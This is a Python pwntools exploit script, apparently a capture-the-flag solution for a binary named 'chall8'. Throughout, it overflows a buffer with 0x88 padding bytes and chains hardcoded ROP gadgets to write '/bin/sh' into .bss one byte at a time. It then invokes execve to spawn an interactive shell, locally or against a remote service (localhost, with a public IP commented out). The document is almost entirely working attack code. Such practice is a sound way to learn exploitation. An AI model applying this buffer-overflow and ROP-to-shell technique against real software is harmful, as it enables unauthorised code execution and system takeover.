#!/usr/bin/env python3
from turtle import clear
from pwn import *

# Definitions
e = context.binary = ELF('./chall8', checksec=False)
context.terminal = ['terminator', '-e']

if args.REMOTE:
    #io = remote('209.126.8.12',2230)
    io = remote("localhost", 2230)
else:
    io = process(e.path)

# Gadgets
rsi_rdx_syscall = p64(0x401002) # pop rsi; pop rdx; mov eax, 1; mov edi, 1; syscall; ret;
rax_rdi_syscall = p64(0x40101b) # pop rax; pop rdi; syscall; ret;
memset = p64(0x401020)

# Exploit
def arbwrite(d, a):
    payload = b''
    pos = a
    for c in d:
        payload += rsi_rdx_syscall
        payload += p64(1)
        payload += p64(c)
        payload += rax_rdi_syscall
        payload += p64(1)
        payload += p64(pos)
        payload += memset
        pos += 1
    return payload

def pwn():
    bss_addr = 0x4023e0
    payload = 0x88*b'A'

    # Write /bin/sh to .bss
    payload += arbwrite(b'/bin/sh\0', bss_addr)

    # execve("/bin/sh", 0, 0)
    payload += rsi_rdx_syscall
    payload += p64(0)
    payload += p64(0)
    payload += rax_rdi_syscall
    payload += p64(59)
    payload += p64(bss_addr)
    
    print(len(payload))
    io.sendlineafter('> ', payload)
    io.recvrepeat(0.01)

pwn()
io.interactive()
